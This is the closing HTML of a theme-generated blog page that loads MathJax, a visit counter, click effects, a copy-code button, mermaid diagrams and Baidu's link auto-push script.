<script src="https://cdn.jsdelivr.net/npm/mathjax@2.7.6/unpacked/MathJax.js?config=TeX-AMS-MML_HTMLorMML"></script>
<script>
  var ayerConfig = {
    mathjax: true
  }
</script>

<!-- Katex -->

<!-- busuanzi  -->


<script src="/js/busuanzi-2.3.pure.min.js"></script>


<!-- ClickLove -->

<!-- ClickBoom1 -->

<!-- ClickBoom2 -->


<script src="/js/clickBoom2.js"></script>


<!-- CodeCopy -->


<link rel="stylesheet" href="/css/clipboard.css">

<script src="https://cdn.jsdelivr.net/npm/clipboard@2/dist/clipboard.min.js"></script>
<script>
  function wait(callback, seconds) {
    var timelag = null;
    timelag = window.setTimeout(callback, seconds);
  }
  !function (e, t, a) {
    var initCopyCode = function(){
      var copyHtml = '';
      copyHtml += '<button class="btn-copy" data-clipboard-snippet="">';
      copyHtml += '<i class="ri-file-copy-2-line"></i><span>COPY</span>';
      copyHtml += '</button>';
      $(".highlight .code pre").before(copyHtml);
      $(".article pre code").before(copyHtml);
      var clipboard = new ClipboardJS('.btn-copy', {
        target: function(trigger) {
          return trigger.nextElementSibling;
        }
      });
      clipboard.on('success', function(e) {
        let $btn = $(e.trigger);
        $btn.addClass('copied');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-checkbox-circle-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPIED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-checkbox-circle-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
      clipboard.on('error', function(e) {
        e.clearSelection();
        let $btn = $(e.trigger);
        $btn.addClass('copy-failed');
        let $icon = $($btn.find('i'));
        $icon.removeClass('ri-file-copy-2-line');
        $icon.addClass('ri-time-line');
        let $span = $($btn.find('span'));
        $span[0].innerText = 'COPY FAILED';
        
        wait(function () { // 等待两秒钟后恢复
          $icon.removeClass('ri-time-line');
          $icon.addClass('ri-file-copy-2-line');
          $span[0].innerText = 'COPY';
        }, 2000);
      });
    }
    initCopyCode();
  }(window, document);
</script>


<!-- CanvasBackground -->


<script src="/js/dz.js"></script>


<!-- mermaid -->

  <script src='https://cdn.bootcdn.net/ajax/libs/mermaid/8.5.2/mermaid.min.js'></script>
  <script>
    if (window.mermaid) {
      mermaid.initialize({theme: 'forest'});
    }
  </script>

<!-- baiduSpider auto push -->

  <script>
    (function(){
        var bp = document.createElement('script');
        var curProtocol = window.location.protocol.split(':')[0];
        if (curProtocol === 'https'){
       bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
      }
      else{
      bp.src = 'http://push.zhanzhang.baidu.com/push.js';
      }
        var s = document.getElementsByTagName("script")[0];
        s.parentNode.insertBefore(bp, s);
    })();
    </script>


    
  </div>
</body>

</html>